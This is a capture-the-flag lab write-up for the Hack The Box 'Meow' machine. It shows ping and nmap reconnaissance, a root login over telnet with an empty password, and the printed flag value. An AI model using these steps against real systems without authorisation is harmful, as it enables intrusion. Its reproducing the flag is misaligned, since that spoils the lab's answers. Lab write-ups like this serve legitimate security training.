HTB Starting Point – Meow

Difficulty: Very Easy
Date: 13/11/2025

---

VPN Connection

The .ovpn file was downloaded into the sf_shared directory of the Kali Linux VM.
The connection to the HTB VPN was started using:

sudo openvpn --config /media/sf_Shared/starting_point_ctrlxrico.ovpn --daemon


Assigned IP: 10.10.14.13
Target: 10.129.1.17

---

Verification Tasks
Task 1 – Meaning of the acronym VM

Answer: Virtual Machine
Status: Correct

---

Task 2 – Tool used to issue commands via CLI

Answer: Terminal
Status: Correct

---

Task 3 – Service used to establish the VPN connection

Answer: OpenVPN
Status: Correct

---

Task 4 – Tool used to send ICMP Echo requests

Answer: Ping
Status: Correct

Evidence
ping -c 5 10.129.1.17
PING 10.129.1.17 (10.129.1.17) 56(84) bytes of data.
64 bytes from 10.129.1.17: icmp_seq=1 ttl=63 time=61.0 ms
64 bytes from 10.129.1.17: icmp_seq=2 ttl=63 time=60.5 ms
64 bytes from 10.129.1.17: icmp_seq=3 ttl=63 time=60.4 ms
64 bytes from 10.129.1.17: icmp_seq=4 ttl=63 time=60.8 ms

--- 10.129.1.17 ping statistics ---
5 packets transmitted, 4 received, 20% packet loss, time 4008ms
rtt min/avg/max/mdev = 60.434/60.684/60.993/0.235 ms

---

Task 5 – Most common tool for port scanning

Answer: Nmap
Status: Correct

Evidence
nmap 10.129.1.17
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-13 02:34 CET
Nmap scan report for 10.129.1.17
Host is up (0.062s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
23/tcp open  telnet

Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds

---

Task 6 – Service identified on port 23/tcp

Answer: Telnet
Status: Correct

---

Task 7 – User able to log in via Telnet with an empty password

Answer: root
Status: Correct

---

Task 8 – Root Flag

A Telnet connection was established on port 23:

telnet 10.129.1.17
Meow login: root


After obtaining access, the flag was retrieved from the root home directory:

root@Meow:~# ls
flag.txt  snap

root@Meow:~# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19


Flag: b40abdfe23665f766f9c61ecba8a4c19
Status: Correct

---

Notes

This machine highlights the security risks caused by exposed Telnet services using default or empty credentials.
